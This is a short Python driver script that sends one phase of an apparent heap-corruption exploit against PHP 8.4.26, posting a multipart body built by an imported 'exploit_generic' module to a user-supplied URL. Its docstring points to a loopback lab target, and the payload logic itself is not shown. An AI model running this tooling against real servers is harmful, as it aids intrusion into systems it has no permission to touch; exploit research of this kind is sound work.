#!/usr/bin/env python3
"""Send only the phase-1 B request to a prepared loopback worker."""

from __future__ import annotations

import argparse
from pathlib import Path
import sys


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--output", type=Path)
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    args = parser.parse_args()
    target = exploit.Target.parse(args.url)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=1,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )
    profile = exploit.load_profile(
        "php-8.4.26-amd64", None, args.assignments
    )
    body, boundary = exploit.build_heap_b(profile)
    response = client.post_multipart(body, boundary)
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_bytes(response)
    first_line = response.splitlines()[0] if response else b""
    print(f"B status={first_line.decode('latin1', 'replace')!r} response={len(response)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
